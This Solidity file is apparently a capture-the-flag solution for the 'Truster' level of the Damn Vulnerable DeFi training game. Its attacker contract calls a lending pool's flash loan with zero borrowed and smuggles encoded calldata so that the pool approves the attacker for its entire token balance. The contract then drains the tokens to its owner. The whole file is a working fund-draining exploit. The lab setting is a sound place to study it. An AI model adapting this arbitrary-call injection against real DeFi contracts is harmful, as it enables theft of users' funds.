pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";
import "./TrusterLenderPool.sol";

contract TrusterPoolAttacker {

    using Address for address;

    IERC20 immutable damnValuableToken;
    TrusterLenderPool immutable lendingPool;
    address immutable owner;

    constructor (address pool, address tokenAddress) {
        owner = msg.sender;
        lendingPool = TrusterLenderPool(pool);
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack() public {
        require(msg.sender == owner, "You are not the attacker!");
        uint256 poolDVTBalance = damnValuableToken.balanceOf(address(lendingPool));
        require(poolDVTBalance > 0, "There are no funds left to steal!");

        lendingPool.flashLoan(
            0, // don't borrow any funds
            address(this),
            address(damnValuableToken),
            // approve the withdrawal of all DVT from the pool to this contract
            abi.encodeWithSignature("approve(address,uint256)", address(this), uint256(poolDVTBalance))
        );

        // transfer all DVT to this contract
        damnValuableToken.transferFrom(
            address(lendingPool),
            address(this),
            poolDVTBalance
        );

        // transfer all DVT to the attacker
        damnValuableToken.transfer(
            owner,
            damnValuableToken.balanceOf(address(this))
        );
    }

}
